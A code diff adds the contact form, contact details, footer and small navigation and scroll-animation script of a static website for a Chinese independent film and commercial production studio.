+<!-- ═══ 06 联系 ═══ -->
+<section class="sect frame" id="contact" data-title="联系新视觉影视｜项目咨询与拍摄档期预约">
+  <header class="sect-head rise">
+    <span class="no">SEQ.05</span>
+    <h2>场记单 · 把你的片子告诉我们</h2>
+    <span class="rule"></span>
+    <p class="sub">表单在本页直接提交会受静态托管限制，填完点发送会唤起你设备上的邮件客户端，内容已自动写好主题；也可以直接抄地址发信。</p>
+  </header>
+
+  <div class="clap rise">
+    <div class="kicker">Slating Form · 场记单</div>
+    <h2>一句话说清你的项目，剩下的我们来问。</h2>
+    <p>片长、预算、想上线的日期，知道多少填多少，空着的我们来补。</p>
+
+    <form class="form" id="fm" action="mailto:hello@xinshijueyingshi-zh.github.io" method="post" enctype="text/plain" aria-label="项目咨询表单">
+      <div>
+        <label for="f1">怎么称呼</label>
+        <input id="f1" name="name" type="text" autocomplete="name" placeholder="如：林小姐 / 品牌方">
+      </div>
+      <div>
+        <label for="f2">联系方式</label>
+        <input id="f2" name="contact" type="text" autocomplete="email tel" placeholder="微信 / 邮箱 / 电话">
+      </div>
+      <div>
+        <label for="f3">项目类型</label>
+        <input id="f3" name="type" type="text" list="types" placeholder="短片 / TVC / 纪录片 / 后期调色">
+        <datalist id="types">
+          <option value="品牌短片 / 微电影">
+          <option value="广告 TVC（15″/30″）">
+          <option value="纪录片 / 人物纪实">
+          <option value="后期剪辑与调色">
+        </datalist>
+      </div>
+      <div>
+        <label for="f4">期望档期</label>
+        <input id="f4" name="schedule" type="text" placeholder="如：11 月中下旬 / 不急">
+      </div>
+      <div style="grid-column:1/-1">
+        <label for="f5">片子大概是什么样</label>
+        <textarea id="f5" name="brief" placeholder="给谁看、想传达什么、有没有参考片、预算区间……想到什么写什么。"></textarea>
+      </div>
+      <button type="submit" id="sb">发送场记单 →</button>
+    </form>
+
+    <div class="direct">
+      <div>
+        <b>邮件直发</b>
+        <a href="mailto:hello@xinshijueyingshi-zh.github.io">hello@xinshijueyingshi-zh.github.io</a>
+      </div>
+      <div>
+        <b>线上站点</b>
+        <a href="https://xinshijueyingshi-zh.github.io/">xinshijueyingshi-zh.github.io</a>
+      </div>
+      <div>
+        <b>驻地 / 拍摄范围</b>
+        江苏宿迁为起点，江浙沪常态出差，全国可排期
+      </div>
+      <div>
+        <b>回复时效</b>
+        工作日 24 小时内，周末顺延一天
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ 页脚 ═══ -->
+<footer class="foot" role="contentinfo">
+  <div class="foot-in">
+    <div class="blk">
+      新视觉影视 · XSJ FILM
+      <small>独立影视制作 / 短片 / 广告 TVC / 纪录片 / 后期调色</small>
+    </div>
+    <nav aria-label="底部导航">
+      <a href="#reel">作品</a>
+      <a href="#service">服务</a>
+      <a href="#process">流程</a>
+      <a href="#about">关于</a>
+      <a href="#contact">合作</a>
+    </nav>
+    <div class="copy">
+      <span>© 2018–2026 新视觉影视. 站点：<a href="https://xinshijueyingshi-zh.github.io/" style="color:var(--paper-dim);border-bottom:1px solid var(--line-2)">xinshijueyingshi-zh.github.io</a></span>
+      <span>作品版权归对应客户与创作者所有，转载请先沟通。</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var nav=document.getElementById('nav'), tape=document.getElementById('tape');
+  tape.addEventListener('click',function(){
+    var show=nav.classList.toggle('show');
+    tape.setAttribute('aria-expanded',show?'true':'false');
+  });
+  nav.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){nav.classList.remove('show');tape.setAttribute('aria-expanded','false');}
+  });
+
+  document.querySelectorAll('.faq .q').forEach(function(h){
+    h.addEventListener('click',function(){
+      h.classList.toggle('on');
+      h.nextElementSibling.classList.toggle('on');
+    });
+  });
+
+  var io=new IntersectionObserver(function(es){
+    es.forEach(function(e,i){
+      if(e.isIntersecting){
+        setTimeout(function(){e.target.classList.add('in');},i*70);
+        io.unobserve(e.target);
+      }
+    });
+  },{threshold:.12,rootMargin:'0px 0px -8% 0px'});
+  document.querySelectorAll('.rise').forEach(function(el){io.observe(el);});
+
+  document.getElementById('fm').addEventListener('submit',function(){
+    var n=document.getElementById('f1').value.trim()||'（未署名）';
+    var t=document.getElementById('f3').value.trim()||'影视项目咨询';
+    this.setAttribute('subject','[新视觉影视场记单] '+t+' · '+n);
+  });
+})();
+</script>
+</div>
+</body>
+</html>
